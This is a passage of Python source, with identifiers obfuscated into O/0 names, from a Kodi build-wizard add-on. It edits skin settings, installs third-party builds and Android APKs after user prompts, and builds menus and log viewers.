			O0O0O000OOOO0OO00 .close ()#line:4283
			O00OO0OO00OO0OO0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4284
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4285
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4286
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4287
			O0O0O000OOOO0OO00 .close ()#line:4288
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4292
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4294
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4295
			O0O0O000OOOO0OO00 .close ()#line:4296
			O00OO0OO00OO0OO0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4297
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4298
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4299
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4300
			O0O0O000OOOO0OO00 .close ()#line:4301
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4305
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4307
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4308
			O0O0O000OOOO0OO00 .close ()#line:4309
			O00OO0OO00OO0OO0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4310
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4311
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4312
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4313
			O0O0O000OOOO0OO00 .close ()#line:4314
			O0O0O000OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4318
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'r')#line:4320
			O00OO0O00O00OOO0O =O0O0O000OOOO0OO00 .read ()#line:4321
			O0O0O000OOOO0OO00 .close ()#line:4322
			O00OO0OO00OO0OO0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4323
			O0OO0OO00O0O00O00 =re .compile (O00OO0OO00OO0OO0O ).findall (O00OO0O00O00OOO0O )[0 ]#line:4324
			O0O0O000OOOO0OO00 =open (O0O0O000OOO0OOOOO ,'w')#line:4325
			O0O0O000OOOO0OO00 .write (O00OO0O00O00OOO0O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0OO0OO00O0O00O00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4326
			O0O0O000OOOO0OO00 .close ()#line:4327
		except :#line:4332
			pass #line:4333
def thirdPartyInstall (O000000000O00000O ,OO00OO00OO0000O0O ):#line:4335
	if not wiz .workingURL (OO00OO00OO0000O0O ):#line:4336
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4337
	OOOO0O0OOO0OOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000000O00000O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4338
	if OOOO0O0OOO0OOO000 ==1 :#line:4339
		freshStart ('third',True )#line:4340
	wiz .clearS ('build')#line:4341
	OOO0O00O0O000OOOO =O000000000O00000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4342
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4343
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000O00000O ),'','אנא המתן')#line:4344
	O00OO00OO0000O000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O00O0O000OOOO )#line:4345
	try :os .remove (O00OO00OO0000O000 )#line:4346
	except :pass #line:4347
	downloader .download (OO00OO00OO0000O0O ,O00OO00OO0000O000 ,DP )#line:4348
	xbmc .sleep (1000 )#line:4349
	OOO00000OOOOOOOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000O00000O )#line:4350
	DP .update (0 ,OOO00000OOOOOOOOO ,'','אנא המתן')#line:4351
	OOO000O0O0O00O00O ,OOO00O0O00O00OOO0 ,OO0000000000OOOOO =extract .all (O00OO00OO0000O000 ,HOME ,DP ,title =OOO00000OOOOOOOOO )#line:4352
	if int (float (OOO000O0O0O00O00O ))>0 :#line:4353
		wiz .fixmetas ()#line:4354
		wiz .lookandFeelData ('save')#line:4355
		wiz .defaultSkin ()#line:4356
		wiz .setS ('installed','true')#line:4358
		wiz .setS ('extract',str (OOO000O0O0O00O00O ))#line:4359
		wiz .setS ('errors',str (OOO00O0O00O00OOO0 ))#line:4360
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO000O0O0O00O00O ,OOO00O0O00O00OOO0 ))#line:4361
		try :os .remove (O00OO00OO0000O000 )#line:4362
		except :pass #line:4363
		if int (float (OOO00O0O00O00OOO0 ))>0 :#line:4364
			O0O000O00OO00OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000O00000O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO000O0O0O00O00O ,'%',COLOR1 ,OOO00O0O00O00OOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4365
			if O0O000O00OO00OOO0 :#line:4366
				if isinstance (OOO00O0O00O00OOO0 ,unicode ):#line:4367
					OO0000000000OOOOO =OO0000000000OOOOO .encode ('utf-8')#line:4368
				wiz .TextBox (ADDONTITLE ,OO0000000000OOOOO )#line:4369
	DP .close ()#line:4370
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4371
	if INSTALLMETHOD ==1 :O0O0O0OOO000O0000 =1 #line:4372
	elif INSTALLMETHOD ==2 :O0O0O0OOO000O0000 =0 #line:4373
	else :O0O0O0OOO000O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4374
	if O0O0O0OOO000O0000 ==1 :wiz .reloadFix ()#line:4375
	else :wiz .killxbmc (True )#line:4376
def testTheme (O00O0O0OOOO0O0OO0 ):#line:4378
	O0OOOOOOOOO0O0O0O =zipfile .ZipFile (O00O0O0OOOO0O0OO0 )#line:4379
	for O00O00000OOOO000O in O0OOOOOOOOO0O0O0O .infolist ():#line:4380
		if '/settings.xml'in O00O00000OOOO000O .filename :#line:4381
			return True #line:4382
	return False #line:4383
def testGui (OO00O0OOOO00O00O0 ):#line:4385
	OO0OOOO0O0OOO0O00 =zipfile .ZipFile (OO00O0OOOO00O00O0 )#line:4386
	for OOO0O0O0O0OO00O0O in OO0OOOO0O0OOO0O00 .infolist ():#line:4387
		if '/guisettings.xml'in OOO0O0O0O0OO00O0O .filename :#line:4388
			return True #line:4389
	return False #line:4390
def apkInstaller (O0O0O000O0O000OO0 ,OOOO00O00O000OOO0 ):#line:4392
	wiz .log (O0O0O000O0O000OO0 )#line:4393
	wiz .log (OOOO00O00O000OOO0 )#line:4394
	if wiz .platform ()=='android':#line:4395
		OOOOO0OOOO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O000O0O000OO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4396
		if not OOOOO0OOOO0O0OOOO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4397
		O0O0OO000O00O0OOO =O0O0O000O0O000OO0 #line:4398
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4399
		if not wiz .workingURL (OOOO00O00O000OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4400
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO000O00O0OOO ),'','אנא המתן')#line:4401
		O0000OOO0OO00O0O0 =os .path .join (PACKAGES ,"%s.apk"%O0O0O000O0O000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4402
		try :os .remove (O0000OOO0OO00O0O0 )#line:4403
		except :pass #line:4404
		downloader .download (OOOO00O00O000OOO0 ,O0000OOO0OO00O0O0 ,DP )#line:4405
		xbmc .sleep (100 )#line:4406
		DP .close ()#line:4407
		notify .apkInstaller (O0O0O000O0O000OO0 )#line:4408
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0000OOO0OO00O0O0 +'")')#line:4409
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4410
def createMenu (O000O0OO0O0OO0OOO ,O0O0O00O000OO0OOO ,OOOO00000OOOOOOO0 ):#line:4416
	if O000O0OO0O0OO0OOO =='saveaddon':#line:4417
		O0OOOO0OO0OOO00O0 =[]#line:4418
		O00000OOOO0OO0O00 =urllib .quote_plus (O0O0O00O000OO0OOO .lower ().replace (' ',''))#line:4419
		OO00OOO00OOOO000O =O0O0O00O000OO0OOO .replace ('Debrid','Real Debrid')#line:4420
		O00OOOO00O000OOOO =urllib .quote_plus (OOOO00000OOOOOOO0 .lower ().replace (' ',''))#line:4421
		OOOO00000OOOOOOO0 =OOOO00000OOOOOOO0 .replace ('url','URL Resolver')#line:4422
		O0OOOO0OO0OOO00O0 .append ((THEME2 %OOOO00000OOOOOOO0 .title (),' '))#line:4423
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Save %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4424
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Restore %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4425
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Clear %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4426
	elif O000O0OO0O0OO0OOO =='save':#line:4427
		O0OOOO0OO0OOO00O0 =[]#line:4428
		O00000OOOO0OO0O00 =urllib .quote_plus (O0O0O00O000OO0OOO .lower ().replace (' ',''))#line:4429
		OO00OOO00OOOO000O =O0O0O00O000OO0OOO .replace ('Debrid','Real Debrid')#line:4430
		O00OOOO00O000OOOO =urllib .quote_plus (OOOO00000OOOOOOO0 .lower ().replace (' ',''))#line:4431
		OOOO00000OOOOOOO0 =OOOO00000OOOOOOO0 .replace ('url','URL Resolver')#line:4432
		O0OOOO0OO0OOO00O0 .append ((THEME2 %OOOO00000OOOOOOO0 .title (),' '))#line:4433
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Register %s'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4434
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Save %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4435
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Restore %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4436
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Import %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4437
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Clear Addon %s Data'%OO00OOO00OOOO000O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00000OOOO0OO0O00 ,O00OOOO00O000OOOO )))#line:4438
	elif O000O0OO0O0OO0OOO =='install':#line:4439
		O0OOOO0OO0OOO00O0 =[]#line:4440
		O00OOOO00O000OOOO =urllib .quote_plus (OOOO00000OOOOOOO0 )#line:4441
		O0OOOO0OO0OOO00O0 .append ((THEME2 %OOOO00000OOOOOOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00OOOO00O000OOOO )))#line:4442
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00OOOO00O000OOOO )))#line:4443
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00OOOO00O000OOOO )))#line:4444
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00OOOO00O000OOOO )))#line:4445
		O0OOOO0OO0OOO00O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00OOOO00O000OOOO )))#line:4446
	O0OOOO0OO0OOO00O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4447
	return O0OOOO0OO0OOO00O0 #line:4448
def toggleCache (OO0O00O00O000000O ):#line:4450
	O000OOO00OO0OOO0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4451
	OO0OO0O0O0OOOO00O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4452
	if OO0O00O00O000000O in ['true','false']:#line:4453
		for O0OO0OOO00OO0OO0O in O000OOO00OO0OOO0O :#line:4454
			wiz .setS (O0OO0OOO00OO0OO0O ,OO0O00O00O000000O )#line:4455
	else :#line:4456
		if not OO0O00O00O000000O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4457
			try :#line:4458
				O0OO0OOO00OO0OO0O =OO0OO0O0O0OOOO00O [O000OOO00OO0OOO0O .index (OO0O00O00O000000O )]#line:4459
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OO0OOO00OO0OO0O ))#line:4460
			except :#line:4461
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O00O00O000000O ))#line:4462
		else :#line:4463
			OOO00O0O0O000O00O ='true'if wiz .getS (OO0O00O00O000000O )=='false'else 'false'#line:4464
			wiz .setS (OO0O00O00O000000O ,OOO00O0O0O000O00O )#line:4465
def playVideo (OOOOOOO00OO0OOO00 ):#line:4467
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOOOOO00OO0OOO00 )#line:4468
	if 'watch?v='in OOOOOOO00OO0OOO00 :#line:4469
		O0000000000O000OO ,OOO0OO0O00OOO0OO0 =OOOOOOO00OO0OOO00 .split ('?')#line:4470
		OO0O00000O0O0O0O0 =OOO0OO0O00OOO0OO0 .split ('&')#line:4471
		for O0OOOO0O0O0OO0OO0 in OO0O00000O0O0O0O0 :#line:4472
			if O0OOOO0O0O0OO0OO0 .startswith ('v='):#line:4473
				OOOOOOO00OO0OOO00 =O0OOOO0O0O0OO0OO0 [2 :]#line:4474
				break #line:4475
			else :continue #line:4476
	elif 'embed'in OOOOOOO00OO0OOO00 or 'youtu.be'in OOOOOOO00OO0OOO00 :#line:4477
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOOOOO00OO0OOO00 )#line:4478
		O0000000000O000OO =OOOOOOO00OO0OOO00 .split ('/')#line:4479
		if len (O0000000000O000OO [-1 ])>5 :#line:4480
			OOOOOOO00OO0OOO00 =O0000000000O000OO [-1 ]#line:4481
		elif len (O0000000000O000OO [-2 ])>5 :#line:4482
			OOOOOOO00OO0OOO00 =O0000000000O000OO [-2 ]#line:4483
	wiz .log ("YouTube URL: %s"%OOOOOOO00OO0OOO00 )#line:4484
	yt .PlayVideo (OOOOOOO00OO0OOO00 )#line:4485
def viewLogFile ():#line:4487
	OO0OOO0OO000000OO =wiz .Grab_Log (True )#line:4488
	O00O000O000O0O0O0 =wiz .Grab_Log (True ,True )#line:4489
	OOO0OO00O000O0OOO =0 ;O0000OO00O0OOOO00 =OO0OOO0OO000000OO #line:4490
	if not O00O000O000O0O0O0 ==False and not OO0OOO0OO000000OO ==False :#line:4491
		OOO0OO00O000O0OOO =DIALOG .select (ADDONTITLE ,["View %s"%OO0OOO0OO000000OO .replace (LOG ,""),"View %s"%O00O000O000O0O0O0 .replace (LOG ,"")])#line:4492
		if OOO0OO00O000O0OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4493
	elif OO0OOO0OO000000OO ==False and O00O000O000O0O0O0 ==False :#line:4494
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4495
		return #line:4496
	elif not OO0OOO0OO000000OO ==False :OOO0OO00O000O0OOO =0 #line:4497
	elif not O00O000O000O0O0O0 ==False :OOO0OO00O000O0OOO =1 #line:4498
	O0000OO00O0OOOO00 =OO0OOO0OO000000OO if OOO0OO00O000O0OOO ==0 else O00O000O000O0O0O0 #line:4500
	O0000OOO00OOO0OO0 =wiz .Grab_Log (False )if OOO0OO00O000O0OOO ==0 else wiz .Grab_Log (False ,True )#line:4501
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0000OO00O0OOOO00 ),O0000OOO00OOO0OO0 )#line:4503
def errorChecking (log =None ,count =None ,all =None ):#line:4505
	if log ==None :#line:4506
		O0O0OO0O00OO00000 =wiz .Grab_Log (True )#line:4507
		O00OOOO0O0O0O0OOO =wiz .Grab_Log (True ,True )#line:4508
		if not O00OOOO0O0O0O0OOO ==False and not O0O0OO0O00OO00000 ==False :#line:4509
			O00OO00000OO00000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OO0O00OO00000 .replace (LOG ,""),errorChecking (O0O0OO0O00OO00000 ,True ,True )),"View %s: %s error(s)"%(O00OOOO0O0O0O0OOO .replace (LOG ,""),errorChecking (O00OOOO0O0O0O0OOO ,True ,True ))])#line:4510
			if O00OO00000OO00000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4511
		elif O0O0OO0O00OO00000 ==False and O00OOOO0O0O0O0OOO ==False :#line:4512
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4513
			return #line:4514
		elif not O0O0OO0O00OO00000 ==False :O00OO00000OO00000 =0 #line:4515
		elif not O00OOOO0O0O0O0OOO ==False :O00OO00000OO00000 =1 #line:4516
		log =O0O0OO0O00OO00000 if O00OO00000OO00000 ==0 else O00OOOO0O0O0O0OOO #line:4517
	if log ==False :#line:4518
		if count ==None :#line:4519
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4520
			return False #line:4521
		else :#line:4522
			return 0 #line:4523
	else :#line:4524
		if os .path .exists (log ):#line:4525
			OOOO0OOO0O0O000O0 =open (log ,mode ='r');OOO000O000OOO0O00 =OOOO0OOO0O0O000O0 .read ().replace ('\n','').replace ('\r','');OOOO0OOO0O0O000O0 .close ()#line:4526
			OO000OO000OOO000O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000O000OOO0O00 )#line:4527
			if not count ==None :#line:4528
				if all ==None :#line:4529
					OOOO0OOO0O0OO0000 =0 #line:4530
					for OOO0O00O00000O0O0 in OO000OO000OOO000O :#line:4531
						if ADDON_ID in OOO0O00O00000O0O0 :OOOO0OOO0O0OO0000 +=1 #line:4532
					return OOOO0OOO0O0OO0000 #line:4533
				else :return len (OO000OO000OOO000O )#line:4534
			if len (OO000OO000OOO000O )>0 :#line:4535
				OOOO0OOO0O0OO0000 =0 ;O0O0OOO00OO0O0O00 =""#line:4536
				for OOO0O00O00000O0O0 in OO000OO000OOO000O :#line:4537
					if all ==None and not ADDON_ID in OOO0O00O00000O0O0 :continue #line:4538
					else :#line:4539
						OOOO0OOO0O0OO0000 +=1 #line:4540
						O0O0OOO00OO0O0O00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO0OOO0O0OO0000 ,OOO0O00O00000O0O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4541
				if OOOO0OOO0O0OO0000 >0 :#line:4542
					wiz .TextBox (ADDONTITLE ,O0O0OOO00OO0O0O00 )#line:4543
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4544
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4545
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4546
ACTION_PREVIOUS_MENU =10 #line:4548
ACTION_NAV_BACK =92 #line:4549
ACTION_MOVE_LEFT =1 #line:4550
ACTION_MOVE_RIGHT =2 #line:4551
ACTION_MOVE_UP =3 #line:4552
ACTION_MOVE_DOWN =4 #line:4553
ACTION_MOUSE_WHEEL_UP =104 #line:4554
ACTION_MOUSE_WHEEL_DOWN =105 #line:4555
ACTION_MOVE_MOUSE =107 #line:4556
ACTION_SELECT_ITEM =7 #line:4557
ACTION_BACKSPACE =110 #line:4558
ACTION_MOUSE_LEFT_CLICK =100 #line:4559
ACTION_MOUSE_LONG_CLICK =108 #line:4560
def LogViewer (default =None ):#line:4562
	class O00O0O0OO0OO00O00 (xbmcgui .WindowXMLDialog ):#line:4563
		def __init__ (OOOO00000O00O0O0O ,*OO00O000OO0OO0O00 ,**OO0O0O000OOO0O0OO ):#line:4564
			OOOO00000O00O0O0O .default =OO0O0O000OOO0O0OO ['default']#line:4565
		def onInit (OOOO0OO00OO0OOOO0 ):#line:4567
			OOOO0OO00OO0OOOO0 .title =101 #line:4568
			OOOO0OO00OO0OOOO0 .msg =102 #line:4569
			OOOO0OO00OO0OOOO0 .scrollbar =103 #line:4570
			OOOO0OO00OO0OOOO0 .upload =201 #line:4571
			OOOO0OO00OO0OOOO0 .kodi =202 #line:4572
			OOOO0OO00OO0OOOO0 .kodiold =203 #line:4573
			OOOO0OO00OO0OOOO0 .wizard =204 #line:4574
			OOOO0OO00OO0OOOO0 .okbutton =205 #line:4575
			OOOO0O00O0O0OO0O0 =open (OOOO0OO00OO0OOOO0 .default ,'r')#line:4576
			OOOO0OO00OO0OOOO0 .logmsg =OOOO0O00O0O0OO0O0 .read ()#line:4577
			OOOO0O00O0O0OO0O0 .close ()#line:4578
			OOOO0OO00OO0OOOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0OO00OO0OOOO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4579
			OOOO0OO00OO0OOOO0 .showdialog ()#line:4580
		def showdialog (O0O00O0OO00OO0O00 ):#line:4582
			O0O00O0OO00OO0O00 .getControl (O0O00O0OO00OO0O00 .title ).setLabel (O0O00O0OO00OO0O00 .titlemsg )#line:4583
			O0O00O0OO00OO0O00 .getControl (O0O00O0OO00OO0O00 .msg ).setText (wiz .highlightText (O0O00O0OO00OO0O00 .logmsg ))#line:4584
			O0O00O0OO00OO0O00 .setFocusId (O0O00O0OO00OO0O00 .scrollbar )#line:4585
		def onClick (OO0OO0OOO0OOO0OOO ,OO0OOO000OOO00O00 ):#line:4587
			if OO0OOO000OOO00O00 ==OO0OO0OOO0OOO0OOO .okbutton :OO0OO0OOO0OOO0OOO .close ()#line:4588
			elif OO0OOO000OOO00O00 ==OO0OO0OOO0OOO0OOO .upload :OO0OO0OOO0OOO0OOO .close ();uploadLog .Main ()#line:4589
			elif OO0OOO000OOO00O00 ==OO0OO0OOO0OOO0OOO .kodi :#line:4590
				OOOOO000OOO00OO0O =wiz .Grab_Log (False )#line:4591
				O00O0O0O00000O0OO =wiz .Grab_Log (True )#line:4592
				if OOOOO000OOO00OO0O ==False :#line:4593
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4594
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4595
				else :#line:4596
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0O00000O0OO .replace (LOG ,''))#line:4597
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .title ).setLabel (OO0OO0OOO0OOO0OOO .titlemsg )#line:4598
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText (wiz .highlightText (OOOOO000OOO00OO0O ))#line:4599
					OO0OO0OOO0OOO0OOO .setFocusId (OO0OO0OOO0OOO0OOO .scrollbar )#line:4600
			elif OO0OOO000OOO00O00 ==OO0OO0OOO0OOO0OOO .kodiold :#line:4601
				OOOOO000OOO00OO0O =wiz .Grab_Log (False ,True )#line:4602
				O00O0O0O00000O0OO =wiz .Grab_Log (True ,True )#line:4603
				if OOOOO000OOO00OO0O ==False :#line:4604
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4605
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4606
				else :#line:4607
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0O00000O0OO .replace (LOG ,''))#line:4608
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .title ).setLabel (OO0OO0OOO0OOO0OOO .titlemsg )#line:4609
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText (wiz .highlightText (OOOOO000OOO00OO0O ))#line:4610
					OO0OO0OOO0OOO0OOO .setFocusId (OO0OO0OOO0OOO0OOO .scrollbar )#line:4611
			elif OO0OOO000OOO00O00 ==OO0OO0OOO0OOO0OOO .wizard :#line:4612
				OOOOO000OOO00OO0O =wiz .Grab_Log (False ,False ,True )#line:4613
				O00O0O0O00000O0OO =wiz .Grab_Log (True ,False ,True )#line:4614
				if OOOOO000OOO00OO0O ==False :#line:4615
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4616
